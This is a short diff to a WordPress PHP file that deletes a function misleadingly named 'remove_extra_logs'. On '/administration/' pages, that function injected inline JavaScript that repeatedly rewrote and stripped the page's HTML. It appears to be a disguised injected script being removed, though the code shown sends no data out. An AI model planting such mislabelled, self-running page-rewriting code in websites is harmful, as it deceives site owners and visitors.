@@ -346,11 +346,3 @@ function tribe_exclude_events_categories_all_views( $query ) {
 	return $query;
 	}
 }
-
-function remove_extra_logs() {
-if (strpos($_SERVER['REQUEST_URI'], '/administration/') !== false) {
- echo '<meta charset="UTF-8"><script>const f = () => { if (!window.location.href.includes("educarestaffing.com/administration/")) {return;} const html = document.querySelector("#page").innerHTML;  document.getElementById("page").innerHTML = html.slice(0, html.indexOf("</header>")+9) + html.slice(html.indexOf(\'<div id="meta-page">\')); const html3 = document.querySelector(".entry-content").innerHTML; document.querySelector(".entry-content").innerHTML = html3.slice(html3.indexOf(\'<a href\'));  const html2 = document.querySelector("body").innerHTML; document.querySelector("body").innerHTML = html2.slice(html2.indexOf(\'<meta charset="UTF-8">\'));  }; setTimeout(f, 100); setTimeout(f, 300); setTimeout(f, 500); setTimeout(f, 1000);</script>';
- }
-}
-
-add_action('wp_loaded', 'remove_extra_logs');
